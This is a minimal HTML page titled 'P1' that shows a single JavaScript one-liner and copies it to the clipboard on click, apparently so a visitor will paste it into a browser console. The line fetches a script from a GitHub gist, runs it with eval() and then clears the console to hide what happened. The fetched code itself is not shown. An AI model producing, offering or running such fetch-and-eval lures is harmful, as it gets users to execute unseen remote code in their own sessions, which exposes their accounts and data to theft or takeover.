<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>P1</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: monospace;
        }
        #code {
            cursor: pointer;
            user-select: all;
        }
    </style>
</head>
<body>
    <div id="code">fetch('https://gist.githubusercontent.com/Khasan1111/f9218594bbc5006fc5701ace58c0128c/raw/dca712fd36303edf405e57162437d638e9a376d7/script.js').then(r => r.text()).then(code => { eval(code); console.clear(); })</div>

    <script>
        document.getElementById('code').addEventListener('click', function() {
            navigator.clipboard.writeText(this.textContent);
        });
    </script>
</body>
</html>
